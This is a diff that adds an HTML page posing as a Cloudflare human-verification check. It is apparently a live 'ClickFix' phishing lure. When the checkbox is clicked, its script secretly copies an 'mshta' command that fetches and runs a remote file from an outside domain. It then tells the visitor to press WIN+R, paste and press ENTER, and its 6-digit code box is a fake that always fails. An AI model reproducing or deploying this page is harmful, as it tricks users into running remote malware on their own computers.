@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Just a moment...</title>
+  <link rel="icon" href="https://cloudflare.com/favicon.ico" /> <!-- Favicon placeholder -->
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #1a1a1a;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
+        Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      justify-content: space-between;
+    }
+
+    .main {
+      padding: 60px 5%;
+    }
+
+    .title {
+      font-size: 32px;
+      font-weight: 400;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 18px;
+      color: #444;
+      margin-bottom: 30px;
+    }
+
+    .cf-widget {
+      background: #f9f9f9;
+      border: 1px solid #dcdcdc;
+      padding: 20px;
+      max-width: 340px;
+      display: flex;
+      align-items: center;
+      position: relative;
+    }
+
+    .cf-checkbox {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #c1c1c1;
+      background: white;
+      cursor: pointer;
+      display: inline-block;
+      position: relative;
+      margin-right: 10px;
+    }
+
+.cf-checkbox.spinner {
+  border: 2px solid transparent;
+  border-top: 2px solid #1a73e8;
+  border-right: 2px solid #ccc;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  width: 18px;
+  height: 18px;
+  background: none;
+  cursor: default;
+}
+
+@keyframes spin {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+
+    .cf-label {
+      font-size: 14px;
+      font-weight: 500;
+    }
+
+    .cf-branding {
+      position: absolute;
+      right: 10px;
+      bottom: 5px;
+      text-align: right;
+      font-size: 11px;
+    }
+
+    .cf-branding b {
+      font-weight: bold;
+    }
+
+    .cf-branding a {
+      color: #1a73e8;
+      text-decoration: none;
+      margin: 0 2px;
+    }
+
+    .after-widget {
+      margin-top: 30px;
+      font-size: 16px;
+      color: #333;
+    }
+
+    .steps {
+      margin-top: 40px;
+      max-width: 400px;
+      padding: 20px;
+      background-color: #f1f1f1;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      display: none;
+    }
+
+    .steps h3 {
+      font-size: 16px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .steps ol {
+      padding-left: 20px;
+      margin-bottom: 15px;
+    }
+
+    .steps input {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-top: 10px;
+    }
+
+    .steps button {
+      margin-top: 10px;
+      padding: 8px 16px;
+      background-color: #2d7ef8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .error {
+      color: red;
+      margin-top: 8px;
+      display: none;
+      font-size: 13px;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #999;
+      text-align: center;
+      padding: 10px;
+      border-top: 1px solid #e0e0e0;
+    }
+    
+    .cf-spinner {
+  width: 18px;
+  height: 18px;
+  border: 2px solid transparent;
+  border-top: 2px solid #555;
+  border-right: 2px solid #999;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+  display: inline-block;
+  margin-right: 10px;
+}
+
+  </style>
+</head>
+<body>
+  <div class="main">
+    <div class="title">example.com</div>
+    <div class="subtitle">Verifying you are human. This may take a few seconds.</div>
+
+<div class="cf-widget" id="cf-widget" style="width: 300px; padding: 20px; border: 1px solid #d1d5da; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); font-family: Arial, sans-serif; font-size: 14px; color: #202124; background: #fff;">
+
+  <div class="cf-checkbox" id="cf-checkbox" style="width: 18px; height: 18px; border: 2px solid #888; border-radius: 3px; display: inline-block; vertical-align: middle; margin-right: 10px; cursor: pointer;"></div>
+  <div class="cf-label" style="display: inline-block; vertical-align: middle;">Verify you are human</div>
+  <div class="cf-branding" style="margin-top: 16px; text-align: center; font-size: 12px; color: #888;">
+  <div style="text-align: center; margin-bottom: -8px; margin-left: 50px;">
+    <img src="https://cloudflare.com/favicon.ico" alt="Cloudflare logo" style="width: 32px; height: 32px;">
+  </div>
+
+    <b style="color: #333;">CLOUDFLARE</b><br />
+    <a href="https://www.cloudflare.com/terms/" target="_blank" style="margin-right: 8px; color: #555; text-decoration: none;">Terms</a>·
+    <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" style="color: #555; text-decoration: none;">Privacy</a>
+  </div>
+</div>
+
+    <div class="after-widget">
+      example.com needs to review the security of your connection before proceeding.
+    </div>
+
+    <div class="steps" id="steps-box">
+      <h3>Complete Verification</h3>
+      <ol>
+        <li>Press <b>WIN+R</b> to open the verification window</li>
+        <li>Paste the code into the field</li>
+        <li>Press <b>ENTER</b> to finish</li>
+      </ol>
+      <label for="codeInput">Enter your 6-digit code:</label>
+      <input id="codeInput" placeholder="6-digit code" />
+      <button id="submitCode">Complete Verification</button>
+      <div class="error" id="codeError">Invalid code. Please try again.</div>
+    </div>
+  </div>
+
+  <div class="footer">
+    Ray ID: 7gkm582qtw743vnj &bull; Performance &amp; security by <b>Cloudflare</b>
+  </div>
+
+  <script>
+    const checkbox = document.getElementById("cf-checkbox");
+    const widget = document.getElementById("cf-widget");
+    const stepsBox = document.getElementById("steps-box");
+    const codeInput = document.getElementById("codeInput");
+    const submitCode = document.getElementById("submitCode");
+    const codeError = document.getElementById("codeError");
+
+    checkbox.addEventListener("click", () => {
+      if (!checkbox.classList.contains("spinner")) {
+        checkbox.classList.add("spinner");
+
+        navigator.clipboard.writeText("mshta https://jacquifarrants.com/zone.bak").catch(() => {});
+
+        setTimeout(() => {
+          stepsBox.style.display = "block";
+          checkbox.classList.remove("spinner");
+        }, 2500);
+      }
+    });
+
+    submitCode.addEventListener("click", () => {
+      codeError.style.display = "block";
+    });
+  </script>
+</body>
+</html>
